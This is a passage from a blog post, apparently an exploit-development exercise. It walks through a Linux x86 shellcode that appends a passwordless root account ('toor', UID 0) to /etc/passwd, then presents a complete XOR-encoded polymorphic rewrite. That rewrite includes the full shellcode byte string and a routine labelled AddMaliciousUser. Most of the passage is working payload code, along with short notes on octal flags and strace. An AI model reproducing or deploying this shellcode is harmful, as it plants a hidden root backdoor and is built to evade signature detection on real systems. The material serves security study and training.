                            &lt;span class=&quot;c1&quot;&gt;; the string is: /etc/passwd#toor::0:0:t00r:/root:/bin/bash #&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;EB38&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3a&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; clear the EAX register&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000003&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; replace the '#' character after '/etc/passwd'&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   with a NULL byte&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000005&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;88460&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; replace the '#' character after '/bin/bash '&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   with a NULL byte&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000008&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;88462&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; replace the space after '/bin/bash'&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   with a Line Feed (0x0a)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;C6462A0A&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; store the pointer to 'toor::0:0:t00r:/root:/bin/bash'&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   into EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;D5E0C&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; save the previous pointer after the following string:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   'toor::0:0:t00r:/root:/bin/bash\x0a\x00'&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000012&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;895&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E2C&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; copy ESI into EBX&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   it's pointing to the string &quot;/etc/passwd&quot;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000015&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D1E&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of open():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   flags applied when opening the file:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - O_APPEND&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - O_CREAT&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - O_RDWR&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000017&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B94204&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x442&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of open():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   mode (mode bits applied when a new file is created):&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - S_IRUSR&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - S_IWUSR&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - S_IRGRP&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;     - S_IROTH&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;BAA401&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1a4&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I've learning something new while analysing this shellcode: that permissions bits in the Linux kernel's source code are represented with the &lt;a href=&quot;https://en.wikipedia.org/wiki/Octal&quot;&gt;octal numeral system&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's look at an example. If you were to check the values for a constant like &lt;code&gt;O_CREAT&lt;/code&gt; in the file &lt;code&gt;/include/uapi/asm-generic/fcntl.h&lt;/code&gt;, you would find something like this:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define O_ACCMODE       00000003
#define O_RDONLY        00000000
#define O_WRONLY        00000001
#define O_RDWR          00000002
&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;#ifndef O_CREAT
#define O_CREAT         00000100        &lt;/span&gt;&lt;span class=&quot;cm&quot;&gt;/* not fcntl */&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Initially I though the number was simply a decimal one. If not, maybe a hexadecimal number. Well, turns out that it's actually an octal one. So you need to convert the number from octal to hex (or decimal when writing your shellcode).&lt;/p&gt;
&lt;p&gt;Another piece of advice. When using &lt;code&gt;strace&lt;/code&gt;, you can pass the arguments &lt;code&gt;-e raw=open&lt;/code&gt; to view the original, raw values, instead of the constants names.&lt;/p&gt;
&lt;p&gt;Back to the shellcode. After the instructions above, the &lt;code&gt;open&lt;/code&gt; syscall is called.&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; invoke syscall open()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B005&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x5&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000021&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;sub class='aside'&gt;Use the &lt;code&gt;open()&lt;/code&gt; syscall to open the file &lt;code&gt;/etc/passwd&lt;/code&gt;, with flags
&lt;/sub&gt;&lt;/p&gt;
&lt;p&gt;Now that the file is opened, it's time to write the new entry:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; 1st argument of write():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   file descriptor of the file want to write&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000023&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D2&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of write():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to the buffer containing the bytes to write&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000027&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;B4E2C&lt;/span&gt;            &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of write():&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   number of bytes to write: 31&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B21F&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall: write()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;B004&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000002&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall: close()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000030&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B006&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000032&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call syscall: exit()&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000034&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B001&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000036&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;DB&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000038&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; part of the JMP-CALL-POP technique&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;; go back to the address 0x00000002&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;E8C3FFFFFF&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; two strings referenced by the previous instructions&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000003&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;F&lt;/span&gt;                &lt;span class=&quot;nv&quot;&gt;das&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;...&lt;/span&gt;       &lt;span class=&quot;nv&quot;&gt;...&lt;/span&gt;               &lt;span class=&quot;nv&quot;&gt;...&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000069&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;2023&lt;/span&gt;              &lt;span class=&quot;nf&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ah&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h2 id=&quot;polymorphic-shellcode&quot;&gt;Polymorphic shellcode&lt;/h2&gt;
&lt;p&gt;Follows the polymorphic version of the shellcode:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; Author: Robert C. Raducioiu (rbct)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Reference: http://shell-storm.org/shellcode/files/shellcode-561.php&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Shellcode: &quot;\xeb\x48\x5f\x89\xfe\x31\xc9\xf7\xe1\xb1\x0b\x81\x37\x71\x63\x63\x75\x83\xc7\x04\xe2\xf5\x89\xf7\x89\xfb\x83\xc3\x0c\x53\x5e\x57\x5b\xb0\x06\x48\xb2\x69\xc1\xc2\x02\x66\xb9\x43\x04\x49\xcd\x80\x93\x31\xc0\x50\x5a\x6a\x20\x5a\x4a\x6a\x03\x58\x40\x56\x59\xcd\x80\x31\xc0\xb0\x06\xcd\x80\x40\xcd\x80\xe8\xb3\xff\xff\xff\x5e\x06\x17\x16\x5e\x13\x02\x06\x02\x14\x07\x75\x05\x0c\x0c\x07\x4b\x59\x53\x4f\x41\x59\x17\x45\x41\x11\x59\x5a\x03\x0c\x0c\x01\x4b\x4c\x01\x1c\x1f\x4c\x01\x14\x02\x0b\x69\x75&quot;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Length: 123 bytes&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;jmp&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;CallRunShellcode&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;RunShellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;
    
&lt;span class=&quot;nl&quot;&gt;DecodeStringBytes:&lt;/span&gt;
    
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;DWORD&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x75636371&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;loop&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;DecodeStringBytes&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;OpenFile:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;add&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xc&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;dl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x69&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;rol&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x443&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;AddMaliciousUser:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xchg&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;dec&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x3&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;CloseFileHandle:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x6&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;Exit:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;CallRunShellcode:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;call&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RunShellcode&lt;/span&gt;
